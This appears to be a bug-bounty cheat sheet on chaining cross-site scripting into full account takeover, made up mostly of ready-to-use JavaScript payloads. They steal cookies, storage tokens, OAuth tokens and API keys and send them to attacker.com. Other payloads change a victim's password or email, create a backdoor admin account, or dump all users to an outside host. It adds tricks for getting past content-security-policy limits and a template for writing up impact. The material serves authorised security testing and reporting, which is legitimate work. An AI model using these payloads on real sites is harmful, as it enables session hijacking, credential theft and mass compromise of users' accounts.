# XSS → Account Takeover

Turn XSS into complete account compromise.

## Overview

XSS alone might be low/medium severity. Chain it to ATO for critical impact.

```
XSS → Session Theft → OR → Password Change → Full ATO
         ↓                        ↓
    Cookie stealing          Email change + reset
```

## Chain 1: Cookie Theft

### When It Works

- Session cookie **not HttpOnly**
- No additional session binding (IP, fingerprint)

### Payload

```javascript
// Basic exfil
fetch('https://attacker.com/steal?c='+document.cookie);

// With more context
fetch('https://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    url: location.href,
    localStorage: JSON.stringify(localStorage)
  })
});
```

### Attack Flow

1. Inject XSS payload
2. Victim visits page
3. Cookies sent to attacker
4. Attacker replays session cookie
5. Full account access

## Chain 2: Session Token from DOM/Storage

### When It Works

- Cookies are HttpOnly but tokens in:
  - `localStorage`
  - `sessionStorage`
  - DOM elements
  - JavaScript variables

### Payload

```javascript
// localStorage token
fetch('https://attacker.com/steal?token='+localStorage.getItem('auth_token'));

// From DOM
let token = document.querySelector('meta[name="csrf-token"]').content;
fetch('https://attacker.com/steal?csrf='+token);

// From JS variable (if exposed)
fetch('https://attacker.com/steal?token='+window.authToken);
```

## Chain 3: Password Change

### When It Works

- No current password required
- OR current password visible in page/API
- XSS can make authenticated requests

### Payload

```javascript
// Change password directly
fetch('/api/user/password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({new_password: 'hacked123'})
});

// If CSRF token needed
let csrf = document.querySelector('[name=csrf_token]').value;
fetch('/api/user/password', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrf
  },
  body: JSON.stringify({new_password: 'hacked123'})
});
```

## Chain 4: Email Change + Password Reset

### When It Works

- Can change email without current password
- Password reset goes to new email

### Payload

```javascript
// Step 1: Change email
fetch('/api/user/email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});

// Step 2: Trigger password reset (done manually after)
```

### Attack Flow

1. XSS changes victim's email to attacker's
2. Attacker requests password reset
3. Reset link goes to attacker's email
4. Attacker resets password
5. Full account takeover

## Chain 5: OAuth Token Theft

### When It Works

- OAuth/social login
- Tokens in URL fragments or accessible storage

### Payload

```javascript
// Steal OAuth token from URL
if (location.hash.includes('access_token')) {
  fetch('https://attacker.com/steal?token='+location.hash);
}

// Or from storage
fetch('https://attacker.com/steal?oauth='+localStorage.getItem('oauth_token'));
```

## Chain 6: API Key / Secret Theft

### When It Works

- API keys visible in page
- Secrets in JavaScript bundles

### Payload

```javascript
// Extract from page
let apiKey = document.body.innerHTML.match(/api[_-]?key["']?\s*[:=]\s*["']([^"']+)/i);
if (apiKey) fetch('https://attacker.com/steal?key='+apiKey[1]);

// Extract from scripts
fetch('/static/js/config.js')
  .then(r => r.text())
  .then(js => fetch('https://attacker.com/steal?config='+btoa(js)));
```

## Chain 7: Admin XSS → Mass Compromise

### When It Works

- Stored XSS viewed by admin
- Admin can access all user data

### Payload

```javascript
// Create backdoor admin account
fetch('/admin/users/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    username: 'backdoor',
    password: 'hacked123',
    role: 'admin'
  })
});

// Or dump all users
fetch('/admin/users/export')
  .then(r => r.text())
  .then(data => fetch('https://attacker.com/dump', {method:'POST', body:data}));
```

## Bypassing Protections

### HttpOnly Cookies

Can't steal directly. Instead:
- Use XSS to **perform actions** (CSRF via XSS)
- Look for tokens elsewhere (localStorage, DOM)
- Chain with other vulns

### CSP Blocking Exfil

```javascript
// Use img tags (often allowed)
new Image().src = 'https://attacker.com/steal?c='+document.cookie;

// Use DNS exfil
new Image().src = 'https://'+btoa(document.cookie)+'.attacker.com/x.gif';

// Use allowed domains
fetch('https://allowed-cdn.com/log?redirect=https://attacker.com&data=...');
```

### SameSite Cookies

Cookies with `SameSite=Strict` won't be sent on cross-site requests.

But XSS is **same-site**, so it still works!

---

## Impact Statement Template

```
This XSS vulnerability can be chained to achieve complete account 
takeover. An attacker can:

1. [Steal session/Change password/Change email]
2. Gain full access to any user's account
3. Access all private data and perform actions as the victim

Severity: Critical (ATO affects all users)
```
